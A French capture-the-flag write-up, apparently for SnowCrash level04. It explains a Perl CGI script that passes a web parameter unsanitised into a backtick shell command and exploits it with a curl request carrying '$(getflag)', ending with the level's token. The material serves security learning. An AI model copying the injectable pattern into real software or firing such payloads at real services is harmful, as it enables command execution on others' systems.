# LEVEL04

#### level04.pl

On trouve un fichier **level04.pl** avec comme propriètaire flag04.

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Les scripts CGI en Perl est un petit programme perl qui sera lancé depuis un navigateur.
On peut en déduire que cela est une rêquete web, on voit localhost:4747, on peut donc avoir accès au site web via le port `4747

#### Comprendre le script PERL

```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";

# fonction x qui affiche sont paramètre dans le terminal via la commande echo
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}


x(param("x"));
```

Le but va être de faire un subshell en utilisant une commande substitution : $()


```
level04@SnowCrash:~$ curl 127.0.0.1:4747/?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

